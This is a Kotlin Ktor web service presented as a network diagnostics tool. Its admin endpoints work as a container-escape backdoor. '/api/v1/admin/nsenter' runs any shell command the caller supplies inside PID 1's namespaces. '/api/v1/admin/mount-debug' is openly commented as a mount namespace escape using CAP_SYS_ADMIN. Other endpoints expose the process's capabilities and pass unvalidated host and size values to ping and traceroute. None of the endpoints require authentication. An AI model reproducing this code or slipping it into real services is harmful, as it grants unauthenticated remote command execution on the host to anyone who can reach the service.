package com.example.service

import io.ktor.server.application.*
import io.ktor.server.engine.*
import io.ktor.server.netty.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import io.ktor.http.*
import java.io.File
import java.io.BufferedReader
import java.io.InputStreamReader

fun main() {
    embeddedServer(Netty, port = 8080) {
        module()
    }.start(wait = true)
}

fun Application.module() {
    routing {
        // Health check endpoint
        get("/health") {
            call.respondText("OK", ContentType.Text.Plain)
        }

        // Diagnostic endpoint for network troubleshooting
        post("/api/v1/diagnostics/network") {
            val params = call.receiveParameters()
            val targetHost = params["host"] ?: "localhost"
            val action = params["action"] ?: "ping"

            val result = when (action) {
                "ping" -> executeDiagnostic("ping", listOf("-c", "3", targetHost))
                "traceroute" -> executeDiagnostic("traceroute", listOf("-m", "10", targetHost))
                "resolve" -> executeDiagnostic("nslookup", listOf(targetHost))
                else -> "Unknown action"
            }

            call.respondText(result, ContentType.Text.Plain)
        }

        // System info endpoint used by orchestrator
        get("/api/v1/system/capabilities") {
            val capFile = File("/proc/self/status")
            val caps = if (capFile.exists()) {
                capFile.readLines().filter { it.startsWith("Cap") }.joinToString("\n")
            } else {
                "capabilities info unavailable"
            }
            call.respondText(caps, ContentType.Text.Plain)
        }

        // Mount namespace escape - attempts to leverage CAP_SYS_ADMIN
        post("/api/v1/admin/mount-debug") {
            val params = call.receiveParameters()
            val source = params["source"] ?: "/tmp"
            val target = params["target"] ?: "/mnt/debug"
            val fstype = params["fstype"] ?: "tmpfs"

            // This requires CAP_SYS_ADMIN to succeed
            val result = executeDiagnostic("mount", listOf("-t", fstype, source, target))
            call.respondText(result, ContentType.Text.Plain)
        }

        // Raw socket creation for custom ICMP - requires CAP_NET_RAW
        post("/api/v1/diagnostics/raw-ping") {
            val params = call.receiveParameters()
            val targetHost = params["host"] ?: "127.0.0.1"
            val packetSize = params["size"] ?: "64"

            // Uses raw sockets which require CAP_NET_RAW
            val result = executeDiagnostic("ping", listOf("-c", "1", "-s", packetSize, targetHost))
            call.respondText(result, ContentType.Text.Plain)
        }

        // Namespace manipulation endpoint
        post("/api/v1/admin/nsenter") {
            val params = call.receiveParameters()
            val pid = params["pid"] ?: "1"
            val cmd = params["cmd"] ?: "id"

            // nsenter requires CAP_SYS_ADMIN to enter other namespaces
            val result = executeDiagnostic("nsenter", listOf("-t", pid, "-m", "-u", "-i", "-n", "-p", "--", "sh", "-c", cmd))
            call.respondText(result, ContentType.Text.Plain)
        }
    }
}

fun executeDiagnostic(command: String, args: List<String>): String {
    return try {
        val processBuilder = ProcessBuilder(listOf(command) + args)
        processBuilder.redirectErrorStream(true)
        val process = processBuilder.start()
        val reader = BufferedReader(InputStreamReader(process.inputStream))
        val output = StringBuilder()
        var line: String?
        while (reader.readLine().also { line = it } != null) {
            output.appendLine(line)
        }
        val exitCode = process.waitFor()
        if (exitCode != 0) {
            output.appendLine("[exit code: $exitCode]")
        }
        output.toString()
    } catch (e: Exception) {
        "Error executing diagnostic: ${e.message}"
    }
}
